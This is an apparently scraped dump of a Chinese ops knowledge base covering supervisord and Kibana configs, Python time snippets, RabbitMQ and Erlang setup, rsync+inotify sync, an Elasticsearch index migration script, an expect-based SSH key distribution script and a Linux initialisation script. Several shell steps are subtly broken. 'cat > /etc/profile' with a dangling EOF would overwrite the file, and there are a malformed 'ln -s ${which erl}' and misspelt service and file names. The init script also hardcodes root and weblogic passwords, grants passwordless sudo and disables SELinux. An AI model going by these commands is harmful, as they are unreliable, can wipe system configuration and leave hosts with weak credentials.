minprocs=65535 ; min. avail process descriptors;default 200 ;umask=022 ; process file creation umask; default 022 ;user=supervisord ; setuid to this UNIX account at startup; recommended if root ;identifier=supervisor ; supervisord identifier, default is 'supervisor' ;directory=/tmp ; default is not to cd during start ;nocleanup=true ; don't clean up tempfiles at start; default false ;childlogdir=/tmp ; 'AUTO' child log dir, default $TEMP ;environment=KEY=\"value\" ; key value pairs to add to environment ;strip_ansi=false ; strip ansi escape codes in logs; def. false [supervisorctl] serverurl=unix:///var/log/supervisor/supervisor.sock ; use a unix:// URL for a unix socket ;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket ;username=chris ; should be same as in [*_http_server] if set ;password=123 ; should be same as in [*_http_server] if set ;prompt=mysupervisor ; cmd line prompt (default \"supervisor\") ;history_file=~/.sc_history ; use readline history if available ;[program:theprogramname] ;command=/bin/cat ; the program (relative uses PATH, can take args) ;process_name=%(program_name)s ; process_name expr (default %(program_name)s) ;numprocs=1 ; number of processes copies to start (def 1) ;directory=/tmp ; directory to cwd to before exec (def no cwd) ;umask=022 ; umask for process (default None) ;priority=999 ; the relative start priority (default 999) ;autostart=true ; start at supervisord start (default: true) ;startsecs=1 ; # of secs prog must stay up to be running (def. 1) ;startretries=3 ; max # of serial start failures when starting (default 3) ;autorestart=unexpected ; when to restart if exited after running (def: unexpected) ;exitcodes=0 ; 'expected' exit codes used with autorestart (default 0) ;stopsignal=QUIT ; signal used to kill process (default TERM) ;stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10) ;stopasgroup=false ; send stop signal to the UNIX process group (default false) ;killasgroup=false ; SIGKILL the UNIX process group (def false) ;user=chrism ; setuid to this UNIX account to run the program ;redirect_stderr=true ; redirect proc stderr to stdout (default false) ;stdout_logfile=/a/path ; stdout log path, NONE for none; default AUTO ;stdout_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stdout_logfile_backups=10 ; # of stdout logfile backups (0 means none, default 10) ;stdout_capture_maxbytes=1MB ; number of bytes in 'capturemode' (default 0) ;stdout_events_enabled=false ; emit events on stdout writes (default false) ;stdout_syslog=false ; send stdout to syslog with process name (default false) ;stderr_logfile=/a/path ; stderr log path, NONE for none; default AUTO ;stderr_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stderr_logfile_backups=10 ; # of stderr logfile backups (0 means none, default 10) ;stderr_capture_maxbytes=1MB ; number of bytes in 'capturemode' (default 0) ;stderr_events_enabled=false ; emit events on stderr writes (default false) ;stderr_syslog=false ; send stderr to syslog with process name (default false) ;environment=A=\"1\",B=\"2\" ; process environment additions (def no adds) ;serverurl=AUTO ; override serverurl computation (childutils) ; The sample eventlistener section below shows all possible eventlistener ; subsection values. Create one or more 'real' eventlistener: sections to be ; able to handle event notifications sent by supervisord. ;[eventlistener:theeventlistenername] ;command=/bin/eventlistener ; the program (relative uses PATH, can take args) ;process_name=%(program_name)s ; process_name expr (default %(program_name)s) ;numprocs=1 ; number of processes copies to start (def 1) ;events=EVENT ; event notif. types to subscribe to (req'd) ;buffer_size=10 ; event buffer queue size (default 10) ;directory=/tmp ; directory to cwd to before exec (def no cwd) ;umask=022 ; umask for process (default None) ;priority=-1 ; the relative start priority (default -1) ;autostart=true ; start at supervisord start (default: true) ;startsecs=1 ; # of secs prog must stay up to be running (def. 1) ;startretries=3 ; max # of serial start failures when starting (default 3) ;autorestart=unexpected ; autorestart if exited after running (def: unexpected) ;exitcodes=0 ; 'expected' exit codes used with autorestart (default 0) ;stopsignal=QUIT ; signal used to kill process (default TERM) ;stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10) ;stopasgroup=false ; send stop signal to the UNIX process group (default false) ;killasgroup=false ; SIGKILL the UNIX process group (def false) ;user=chrism ; setuid to this UNIX account to run the program ;redirect_stderr=false ; redirect_stderr=true is not allowed for eventlisteners ;stdout_logfile=/a/path ; stdout log path, NONE for none; default AUTO ;stdout_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stdout_logfile_backups=10 ; # of stdout logfile backups (0 means none, default 10) ;stdout_events_enabled=false ; emit events on stdout writes (default false) ;stdout_syslog=false ; send stdout to syslog with process name (default false) ;stderr_logfile=/a/path ; stderr log path, NONE for none; default AUTO ;stderr_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stderr_logfile_backups=10 ; # of stderr logfile backups (0 means none, default 10) ;stderr_events_enabled=false ; emit events on stderr writes (default false) ;stderr_syslog=false ; send stderr to syslog with process name (default false) ;environment=A=\"1\",B=\"2\" ; process environment additions ;serverurl=AUTO ; override serverurl computation (childutils) ; The sample group section below shows all possible group values. Create one ; or more 'real' group: sections to create \"heterogeneous\" process groups. ;[group:thegroupname] ;programs=progname1,progname2 ; each refers to 'x' in [program:x] definitions ;priority=999 ; the relative start priority (default 999) ; The [include] section can just contain the \"files\" setting. This ; setting can list multiple files (separated by whitespace or ; newlines). It can also contain wildcards. The filenames are ; interpreted as relative to this file. Included files *cannot* ; include files themselves. [include] files = supervisord.d/*.conf EOF 服务进程管理 cat /etc/supervisord.d/kibana.conf [program:kibana] directory = /usr/local/elk/kibana-7.7.1/bin ; 程序的启动目录 command = sh kibana ; 启动命令，与命令行启动的命令是一样的 autostart = true ; 在 supervisord 启动的时候也自动启动 startsecs = 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了 autorestart = true ; 程序异常退出后自动重启 startretries = 3 ; 启动失败自动重试次数，默认是 3 user = elastic ; 用哪个用户启动 redirect_stderr = true ; 把 stderr 重定向到 stdout，默认 false stdout_logfile_maxbytes = 20MB ; stdout 日志文件大小，默认 50MB stdout_logfile_backups = 10 ; stdout 日志文件备份数 ; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件） stdout_logfile = /var/log/kibana.log ;日志统一放在log目录下 EOF 常用操作 启动 supervisord -c /etc/supervisord.conf 修改了配置文件重载 supervisorctl update supervisorctl stop programxxx，停止某一个进程(programxxx)，programxxx 为 [program:beepkg] 里配置的值，这个示例就是 beepkg。 supervisorctl start programxxx，启动某个进程。 supervisorctl restart programxxx，重启某个进程。 supervisorctl status，查看进程状态。 supervisorctl stop groupworker ，重启所有属于名为 groupworker 这个分组的进程(start,restart 同理)。 supervisorctl stop all，停止全部进程，注：start、restart、stop 都不会载入最新的配置文件。 supervisorctl reload，载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程。 supervisorctl update，根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启。 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Python时间/":{"url":"Python时间/","title":"Python时间","keywords":"","body":"Python时间操作 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Python时间/hashlib.html":{"url":"Python时间/hashlib.html","title":"Hashlib","keywords":"","body":" import hashlib m1 = hashlib.md5('yongxiaodong'.encode('utf-8')) res = m1.hexdigest() print(res) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Python时间/时间操作.html":{"url":"Python时间/时间操作.html","title":"时间操作","keywords":"","body":"time模块 时间戳 import time time.time() 格式化时间, 主要用于展示使用 import time time.strftime('%Y-%m-%d %H:%M:%S') # 也可以使用%X 代替%H:%M:%S，如： time.strftime('%Y-%m-%d %X') 获取详细的时间信息, struct_time import time res = time.localtime() # 获取年 res.tm_year datetime 模块 ，可以用在需要进行时间天数、分钟、周等加减的场景 获取时间 import datetime print(datetime.datetime.now()) # 世界标准时间 print(datetime.datetime.utcnow()) 时间的加减 import datetime # 时间往后加2天 datetime.datetime.now() + datetime.timedelta(days=2) # 时间往后加2分钟 datetime.datetime.now() + datetime.timedelta(minutes=2) # 时间往后加2周 datetime.datetime.now() + datetime.timedelta(weeks=2) 时间戳转struct_time 时间 import datetime datetime.datetime.fromtimestamp(343434) format string time timestamp 互相转换 import time # 字符串时间 s = '1996-11-23 10:00:00' # 字符串时间转换为 struct_time struct_time = time.strptime(s, '%Y-%m-%d %H:%M:%S') #print(struct_time) # time.struct_time(tm_year=1996, tm_mon=11, tm_mday=23, tm_hour=10, tm_min=0, tm_sec=0, tm_wday=5, tm_yday=328, tm_isdst=-1) # struct_time 转换为timestamp 并 加7天的秒钟数 timestamp = time.mktime(struct_time) + 7 * 86400 # print(timestamp) # 849319200.0 # 再将timestamp转换为展示时间 res = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp)) # print(res) # 1996-11-30 10:00:00 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"RabbitMQ/":{"url":"RabbitMQ/","title":"Rabbit MQ","keywords":"","body":"erlang 版本：Erlang/OTP 23 RabbitMQ 版本：RabbitMQ version: 3.8.4 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:21 "},"RabbitMQ/1.erlang部署.html":{"url":"RabbitMQ/1.erlang部署.html","title":"1.erlang部署","keywords":"","body":"简介 RabbitMQ 由erlang语言开发，所以需要先安装erlang环境才能运行 Centos7 安装erlang 1、依赖安装 yum -y install make gcc gcc-c++ kernel-devel m4 ncurses-devel openssl-devel unixODBC-devel libtool libtool-ltdl-devel 2、 下载并解压 wget http://erlang.org/download/otp_src_23.0.tar.gz tar xf otp_src_23.0.tar.gz && cd otp_src_23.0/ ./configure --prefix=/usr/local/erlang make -j 2 make install 3、配置环境变量 cat > /etc/profile # erlang export ERLANG_HOME=/usr/local/erlang export PATH=$PATH:$ERLANG_HOME/bin EOF 4、 验证是否安装成功 source /etc/profile [root@cs1 elk]# erl # 能进入以下界面表示erlang环境成功 Erlang/OTP 23 [erts-11.0] [source] [64-bit] [smp:4:4] [ds:4:4:10] [async-threads:1] [hipe] Eshell V11.0 (abort with ^G) 1> Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"RabbitMQ/2.RabbitMQ部署.html":{"url":"RabbitMQ/2.RabbitMQ部署.html","title":"2.RabbitMQ部署","keywords":"","body":"安装 1、下载解压 wget http://192.168.1.22:8090/download/attachments/2557088/rabbitmq-server-generic-unix-3.8.4.tar.xz?version=1&modificationDate=1590979700000&api=v2&download=true tar xf rabbitmq-server-generic-unix-3.8.4.tar.xz -C /usr/local/rabbitmq/ 2、配置环境变量 cat > /etc/profile # rabbit mq export PATH=$PATH:/usr/local/rabbitmq/sbin EOF source /etc/profile 启动 rabbitmq-server -detached #后台启动，监听5672端口 附加：常用操作 1、启动rabbitmq rabbitmq-server -detached #后台启动 2、查看服务状态 rabbitmqctl status 3、 停止RabbitMQ rabbitmqctl stop 4、列出/启动插件 列出插件 rabbitmq-plugins list 启用插件 rabbitmq-plugins enable rabbitmq_management 默认端口15672，对外访问即：IP:15672，默认的账号密码是guest，但是该账号只能通过localhost登录 1）添加用户 rabbitmqctl add_user [username] [password] 2）添加权限 rabbitmqctl set_permissions -p \"/\" [username] \".*\" \".*\" \".*\" # \"/\"即vhost 3）修改用户角色 rabbitmqctl set_user_tags [username] administrator 4）修改用户密码 rabbitmqctl change_password [username] [password] 4）查看当前用户列表 rabbitmqctl list_users 5）删除用户 rabbitmqctl delete_user [username] MQ自启动 1、首先需要确保将你的erl 链接到/usr/bin/erl，需要执行 ln -s ${which erl} /usr/bin/erl 2、假设你是在Centos7中采用源码方式安装的RabbitMQ，且安装目录为/usr/local/rabbitmq，你需要执行（注意：以下服务中的user和Group非常重要，不能删除） cat > /usr/lib/systemd/system/rabbitmq-server.service [Unit] Description=RabbitMQ broker After=syslog.target network.target [Service] Type=notify User=root Group=root WorkingDirectory=/usr/local/rabbitmq ExecStart=/usr/local/rabbitmq/sbin/rabbitmq-server ExecStop=/usr/local/rabbitmq/sbin/rabbitmqctl stop [Install] WantedBy=multi-user.target EOF systemctl enable rabbitmq-serve 3、尝试重启服务器验证mq是否正常启动 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"RabbitMQ/RabbitMq镜像集群部署.html":{"url":"RabbitMQ/RabbitMq镜像集群部署.html","title":"RabbitMq镜像集群部署","keywords":"","body":"准备工作 注意：本篇文章只在集群中添加了2个节点，一般集群为了防止脑裂发生，节点数量会采用基数，比如3个节点 1、确保RabbitMQ机器之间可以通过主机名解析，添加hosts解析 普通集群搭建 1、将主节点(node1)的.erlang.cookie 文件复制到各个节点上，保证 /root/.erlang.cookie文件一致 2、在node2上执行命令 加入到node1的集群 确保可以通过node-1解析到主节点 rabbitmq-server -detached rabbitmqctl stop_app rabbitmqctl join_cluster --ram rabbit@node-1 rabbitmqctl start_app 3、查看集群状态 rabbitmqctl cluster_status 注意看以下命令输出结果中的Running Nodes是否显示了已加入集群的节点 至此，普通集群创建完成 镜像集群创建 1、在任意节点执行命令创建同步策略 rabbitmqctl set_policy ha-all \"^.*\" '{\"ha-mode\":\"all\"}' 参数解释： ha-all为策略名称。 ^为匹配符，只有一个^代表匹配所有，^zlh为匹配名称为zlh的 exchanges 或者 queue。 ha-mode为匹配类型，分为 3 种模式： all所有（所有的queue） exctly部分（需配置ha-params参数，此参数为int类型比如3，众多集群中的随机3台机器） nodes指定（需配置ha-params参数，此参数为数组类型比如[\"rabbit@node-1\",\"rabbit@node-2\",,\"rabbit@node-3\"]这样指定为3台机器。） 2、查看策略 rabbitmqctl list_policies 3、 附加：WEb页面创建 or 查看策略 登录web页面--> Admin--> policies 可以查看和添加策略 负载均衡（详细操作方法此处不累述LB常识） 1、可以使用阿里云SLB，调度5672端口即可 2、可以使用Haproxy+keepalived，调度5672端口即可 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"rsync_inotify/":{"url":"rsync_inotify/","title":"Rsync Inotify","keywords":"","body":"rsync 本篇内容名词： rsync服务端: 用于接收同步 客户端： 推送到服务器端 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:21 "},"rsync_inotify/rsync+inofity实时同步.html":{"url":"rsync_inotify/rsync+inofity实时同步.html","title":"rsync+inofity实时同步","keywords":"","body":"rsync 本篇内容名词： rsync服务端: 用于接收同步 客户端： 推送到服务器端 后续内容会实时将客户端的/usr/local/nginx目录推送到服务端 配置rsync服务端置服务端（接收同步数据的机器） centos默认安装了rsync的rpm包 在同步源机器编辑 vim /etc/rsyncd.conf uid = root gid = root use chroot = yes # address = 172.16.2.155 port 873 log file = /var/log/rsyncd.log pid file = /var/run/rsyncd.pid hosts allow = 172.16.0.0/16 read only = no [nginxroot] path = /root/ansible dont compress = *.gz *.zip *.bz2 *.rar *.z *.tar auth users = backuper secrets file = /etc/rsyncd_users.db 2、编辑用户验证文件 echo 'backuper:pwd@123' > /etc/rsyncd_users.db 3、设置权限 chmod 600 /etc/rsyncd_users.db 3、启动rsync rsync --daemon 查看是否成功启动 netstat -anpt | grep rsync 重启rsync服务命令： kill cat /var/run/rsyncd.pid rsync --daemon 客户端配置： 1、创建密码文件 echo 'pwd@123' > /etc/rsync.pass chmod 600 !$ 2、测试将本地目录推送到server端 rsync -az --delete --exclude \"logs\" /usr/local/nginx/ backuper@172.16.31.109::nginxroot --password-file=/etc/rsync.pass 3、安装inotify并测试 # 结合inotify，安装inotify包 yum install inotify-tools -y # 监控/backup目录的的状态变更 inotifywait -mrq -e modify,create,move,delete --exclude=\"logs/\" /usr/local/nginx 4、 自动运行脚本 #!/bin/bash inotifywait -mrq -e modify,create,move,delete --exclude=\"logs\" /usr/local/nginx | while read DIRECTORY EVENT FILE do if [ `pgrep rsync | wc -l` -le 0 ];then rsync -avz --delete --exclude=\"logs\" /usr/local/nginx/ backuper@172.16.31.109::nginxroot --password-file=/etc/rsync.pass fi echo '1' done Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:21 "},"UWSGI/":{"url":"UWSGI/","title":"UWSGI","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:21 "},"UWSGI/Uwsgi+Flask.html":{"url":"UWSGI/Uwsgi+Flask.html","title":"Uwsgi Flask","keywords":"","body":"安装Uwsgi pip install uwsgi Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:21 "},"实用Demo/":{"url":"实用Demo/","title":"实用Demo","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"实用Demo/ES跨集群迁移索引.html":{"url":"实用Demo/ES跨集群迁移索引.html","title":"ES跨集群迁移索引","keywords":"","body":"For Python # coding:utf-8 import sys import json import time,datetime from elasticsearch import Elasticsearch from elasticsearch.helpers import bulk from elasticsearch import helpers import time # example # python es_transfer.py '{\"es_source\":\"192.168.11.75:9200\",\"es_target\":\"192.168.11.9:9920\",\"source_index\":\"new_articles\",\"target_index\":\"new_articles\"}' start_time = time.time() data = sys.argv[1] data = json.loads(data) source_str = data['es_source'] target_str = data['es_target'] source_index = data['source_index'] target_index = data['target_index'] # auth username = 'elastic' password = '' es_source = Elasticsearch(source_str,timeout=500) es_target = Elasticsearch(target_str,http_auth=f\"{username}:{password}\", timeout=500) print('from ' + source_str + '\\\\' + source_index + ' to ' + target_str + '\\\\' + target_index) #build index mapping = es_source.indices.get_mapping(index=source_index) mapping = mapping[source_index]['mappings']['_doc'] try: # ----导入对应index的mapping（不需要可以注释）---- es_target.indices.create(index=target_index) es_target.indices.put_mapping(index=target_index,doc_type='_doc',body=mapping) #es_target.indices.put_mapping(index=target_index,doc_type=source_index,body=mapping) print(\"put mapping finish.\") # ----end---- body = {\"query\":{\"match_all\":{}}} #body = {\"size\":10000,\"query\":{\"terms\":{\"record_uid\":[\"1165829\"]}}} #body = {\"query\":{\"match_all\":{}},\"sort\":[{\"tkPaidTime\":{\"order\":\"desc\"}}]} #body = {\"query\":{\"bool\":{\"filter\":[{\"term\":{\"subsidyType\":\"饿了么\"}},{\"term\":{\"type\":1}}]}}} print(body) data = helpers.reindex(client=es_source,source_index=source_index,target_index=target_index,target_client=es_target,query=body,chunk_size=5000, scroll='15m') print('import finish') print(time.time() - start_time) except Exception as e: print(e) #if str(e) == \"RequestError(400, 'index_already_exists_exception', 'already exists')\": # print(\"index already exists\") # body={\"query\":{\"match_all\":{}}} # helpers.reindex(client=es_source,source_index=source_index,target_index=target_index,target_client=es_target,query=body,chunk_size=5000, scroll='15m') # print('import finish') Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"实用Demo/expect批量建立ssh互信.html":{"url":"实用Demo/expect批量建立ssh互信.html","title":"expect批量建立ssh互信","keywords":"","body":"for shell #!/bin/bash #Author: yongxiaodong #Created with May 17,2017 rpm -qa | grep -q expect if [ $? -ne 0 ];then rpm -ivh tcl-8.5.7-6.el6.x86_64.rpm rpm -ihv expect-5.44.1.15-5.el6_4.x86_64.rpm yum install expect -y fi rpm -qa | grep -q expect if [ $? -ne 0 ];then echo \"please install expect\" exit fi if [ ! -f \"/root/.ssh/id_rsa.pub\" ]; then expect -c \" spawn ssh-keygen expect { \\\"*?id_rsa* \\\" {set timeout 300; send \\\"\\r\\\";exp_continue} \\\"*?passphrase*\\\" {set timeout 300; send \\\"\\r\\\";exp_continue} \\\"*?passphrase*\\\" {set timeout 300; send \\\"\\r\\\";} } expect eof\" fi cat hostsname.txt | while read ipaddr passwd do expect -c \" spawn ssh-copy-id -i /root/.ssh/id_rsa.pub $ipaddr expect { \\\"*?yes/no* \\\" {set timeout 300; send \\\"yes\\r\\\";exp_continue} \\\"*?password:\\\" {set timeout 300; send \\\"$passwd\\r\\\";} } expect eof\" done Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"实用Demo/Linux新系统初始化.html":{"url":"实用Demo/Linux新系统初始化.html","title":"Linux新系统初始化","keywords":"","body":"for shell #!/bin/bash #2017/1/17 #stop service for offser in ip6tables iptables Bluetooth postfix cups cpuspeed NetworkManager vsftpd dhcpd nfs nfslock ypbind rpcbind portreserve xinted do service $offser stop &> /dev/null if [ $? -eq 0 ];then echo \"stop $offser success\" else echo \"stop $offser false\" fi done #set ntp address grep ^server /etc/ntp.conf | head -1 | xargs -i sed -i \"/^{}.*$/i server 10.109.192.35 iburst\" /etc/ntp.conf && echo 'add iburst ntp address success' grep ^server /etc/ntp.conf | head -1 | xargs -i sed -i \"/^{}.*$/i server 10.109.192.12 prefer\" /etc/ntp.conf && echo 'add prefer ntp address success' #set selinux sed -i 's/^SELINUX=.*/SELINUX=disabled/g' /etc/selinux/config && echo 'stop selinux success' #set vlan yum mkdir /etc/yum.repos.d/bak mv /etc/yum.repos.d/* /etc/yum.repos.d/bak/ echo -e \"[a]\\nname=b\\nbaseurl=ftp://10.176.24.118/pub/redhat6.8/\\nenabled=1\\ngpgcheck=0\" > /etc/yum.repos.d/vlan.repo && echo 'add yum success' #lock user for offuser in deamon bin sys adm uucp nuucp printq guest nobody lpd sshd do usermod -L $offuser 2> /dev/null if [ $? -eq 0 ];then echo \"usermod -L $offuser success\" else echo \"usermod -L $offuser false\" fi done #disabled service for offservice in finger telnet sendmail time echo discard daytime chargen comsat klogin kshell ntalk talk tftp uucp dtspc smb ip6tables cups portreserve rpcbind postfix NetworkManager bluetooth vsftpd dhcpd nfslock rpcbind portreserve xinted do chkconfig --level 123456 $offservice off 2> /dev/null if [ $? -eq 0 ];then echo \"chkconfig --level 123456 $offservice off success\" else echo \"chkconfig --level 123456 $offservice off false\" fi done #start service for onservice in sshd ntpd ntpdate cman clvmd rgmanager ricci luci do chkconfig --level 123456 $onservice on 2> /dev/null if [ $? -eq 0 ];then echo \"chkconfig --level 123456 $onservice on success\" else echo \"chkconfig --level 123456 $onservice on false\" fi done #delete suid sgid for desuid in /usr/bin/chage /usr/bin/gpasswd /usr/bin/wall /usr/bin/chfn /usr/bin/chsh /usr/bin/newgrp /usr/bin/write /usr/sbin/usernetctl /bin/mount /bin/umount /sbin/netreport do chmod a-s $desuid 2> /dev/null if [ $? -eq 0 ];then echo \"chmod a-s $desuid success\" else echo \"chmod a-s $deduis false\" fi done #no modification #for chafile in /etc/passwd /etc/shadow /etc/group /etc/gshadow # do # chattr +i $chafile 2> /dev/null # if [ $? -eq 0 ];then # echo \"chattr $chafile success\" # else # echo \"chattr $chafile false\" # fi # done #lock file for lockfile in /etc/audit/auditd.conf /var/log/audit/audit.log /var/log/messages /var/log/cron /var/log/secure /etc/syslog.conf do chmod 640 $lockfile 2> /dev/null if [ $? -eq 0 ];then echo \"chmod 640 $lockfile success\" else echo \"chmod 640 $lockfile false\" fi done for locklog in /var/log/spooler /var/log/mail /var/log/boot.log /var/log/localmessages do chmod 774 $locklog 2> /dev/null if [$? -eq 0 ];then echo \"chmod 774 $locklog success\" else echo \"chmod 774 $locklog false\" fi done mkdir /var/adm echo '''*.err,kern,debug,daemon,notice,mail,crit /var/adm/messages''' >> /etc/rsyslog.conf #su mv /etc/pam.d/su /etc/pam.d/su.bak echo \"auth sufficient pam_rootok.so\">>/etc/pam.d/su echo \"auth required pam_wheel.so group=wheel\">>/etc/pam.d/su cat /etc/pam.d/su.bak >>/etc/pam.d/su chmod 644 /etc/pam.d/su chmod 644 /etc/pam.d/su.bak #set ctrl+alt_del cp -v /etc/init/control-alt-delete.conf /etc/init/control-alt-delete.override sed -i '/^start/'d /etc/init/control-alt-delete.conf && echo \"delete control-alt-delete\" sed -i '/^exec.*$/d' /etc/init/control-alt-delete.conf echo 'exec /usr/bin/logger -p authpriv.notice -t init \"Ctrl-Alt-Del was pressed and ignored\"' >> /etc/init/control-alt-delete.conf && echo \"modify control-alt-delete\" #banner infomation echo 'Banner /etc/issur.net' >> /etc/ssh/sshd_config && echo 'set Banner info' sed -i '1'd /etc/issue.net && echo 'delte issue.conf info' sed -i '/^.*$/i Warning: ATTENTION:Youhaveloggedontoasecuredserver!/' /etc/issue.net && echo 'add issue.conf info' #password security policy sed -i 's/^.*PASS_MAX_DAYS.*[0-9]$/PASS_MAX_DAYS 90/g' /etc/login.defs && echo 'modify pass_max_day 90' sed -i 's/^.*PASS_MIN_DAYS.*[0-9]$/PASS_MIN_DAYS 0/g' /etc/login.defs && echo 'modify pass_min day 0' sed -i 's/^.*PASS_MIN_LEN.*[0-9]$/PASS_MIN_LEN 12/g' /etc/login.defs && echo 'modify pass_min_len 12' sed -i 's/^.*PASS_WARN_AGE.*[0-9]$/PASS_WARN_AGE 7/g' /etc/login.defs && echo 'modify pass_warn_age 7' sed -i '/^password.*type=$/i Password requisite pam_cracklib.so ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 try_first_pass retry=3 type=' /etc/pam.d/system-auth && echo 'password strength policy' sed -i '/^#%PAM.*$/a auth required pam_tally2.so deny=5 unlock_time=300' /etc/pam.d/system-auth && echo \"local login lock user policy\" sed -i '/^#%PAM.*$/a auth required pam_tally2.so even_deny_root deny=5 unlock_time=300' /etc/pam.d/sshd && echo \"ssh login lock user policy\" #time out echo 'export TMOUT=600' >> /etc/profile && echo 'timtou policy' #modify ssh port sed -i 's/^#Port.*22$/Port 10022/g' /etc/ssh/sshd_config sed -i 's/#UseDNS yes/UseDNS no/g' /etc/ssh/sshd_config service sshd reload service ntpd start &> /dev/null #chage -M 91 root #SP1 set echo \"IP=\\`ifconfig | grep 'inet addr:' | awk '{print \\$2}' | awk -F':' '{print \\$2}' | sed -e '/^10.*$/'p -ne '/^22.*$/'p -e '/^20.*/'p | head -n1\\`\" >> /etc/bashrc sed -i '/^.*\\[.*\\=.*\\&\\&.*$/'d /etc/bashrc echo '[ \"$PS1\" = \"\\\\s-\\\\v\\\\\\$ \" ] && PS1=\"[\\u@\\h:$IP:\\w]\\\\$ \"' >> /etc/bashrc #su set useradd weblogic echo 'Ptyw1q2w3e$R' | passwd --stdin weblogic sed -i '/^.*root.*ALL=(ALL).*ALL$/a weblogic ALL=NOPASSWD:ALL,!/bin/su' /etc/sudoers echo 'Ptyw1q2w3e$R' | passwd --stdin root setenforce 0 echo 'ulimit -n 65535' >> /etc/profile Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"系统性能/":{"url":"系统性能/","title":"系统性能","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-06-23 23:39:04 "},"系统性能/系统繁忙指标的意义.html":{"url":"系统性能/系统繁忙指标的意义.html","title":"系统繁忙指标的意义","keywords":"","body":"关于磁盘IO iostat作为systat这个系统自带的使用工具包中的命令，但iostat -x显示的内容中潜伏着一些警告 util值和scvtm值一般用于判断磁盘的利用率和饱和度的重要指标 基础知识 svctm表示向设备发起I/O请求的平均响应时间(被广泛认为是一个操作锁华为的平均时间) util表示向设别发送I/O请求的CPU时间百分比(被广泛认为超过80%就是严重的IO性能瓶颈) svctm和util的值在带有固态驱动器或者RAID上被放大了，这两个字段的值并不能反应出它们的性能限制 iostat手册中将svctm描述警告为平均服务时间（svctm字段）值没有意义，因为I/O统计现在是在块级别计算的，我们不知道磁盘驱动程序何时开始处理请求。 假设A做10件事情需要20分钟，那么平均做每件事情需要2分钟。假设B可以同时做10件事情，做每件事情也同样需要两分钟，这样看来B拥有更高的并行度。但是在单次请求结果方面，A和B处理一次事情的时间都是2分钟 所以在拥有固态或者RAID的服务器中，svctm和uil并不能反应出性能限制 实例: Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util sdd 0.00 0.00 13823.00 0.00 55292.00 0.00 8.00 -1.78 0.06 0.06 0.00 0.06 78.40 Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util sdd 0.00 0.00 72914.67 0.00 291658.67 0.00 8.00 15.27 0.21 0.21 0.00 0.01 100.00 那么%util发生了什么？第一个iostat结果告诉我们，驱动器的利用率为 78.4%，每秒读取13823 次。第二行告诉我们，驱动器在每秒 72914 次读取时被100%使用。如果要14000才能填到78.4%，难道我们不期望它总共只能做18000吗？7.3万怎么做到的？ 这里的问题是出在并行性。当iostat 说%util时，它的意思是“向设备发出 I/O 请求的 CPU 时间百分比”。驱动器至少做一件事的时间百分比。如果它同时做 16 件事，那不会改变。再一次，这个计算对于驱动器来说效果很好，它一次只做一件事。他们花在做一件事上的时间很好地表明了他们真正的忙碌程度。另一方面，SSD（以及 RAID 和 Alice）可以同时做多项事情。如果你可以同时做多件事，你至少做一件事的时间百分比不能很好地预测您的表现潜力 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-06-28 03:23:46 "},"系统性能/零侵入应用性能瓶颈分析.html":{"url":"系统性能/零侵入应用性能瓶颈分析.html","title":"零侵入应用性能瓶颈分析","keywords":"","body":"常见的性能分析工具 ftrace perf systemTap ... 利用Perf性能分析 perf简介 perf是Linux内核内置的性能分析器，能直接定位高级语言中（比如C/Go）的某个函数甚至某行的性能开销，原理是每隔一段时间就在CPU上产生一个中断，在中断上针对进程、函数附加统计值，这样就知道Cpu有多少时间消耗在哪个进程上,再通过反汇编将指令转换为可视化代码。 简单点： 几乎所有的东西都可以使用跟踪器来跟踪和分析。比如TCP/IP过程、应用程序内部、系统内部等等。利用分析器你可以获得洞悉一切的能力，比如strace和tcpdump也可以理解为跟踪器，perf这类系统跟踪器可以获得更多的系统调用数据 什么时候需要Perf 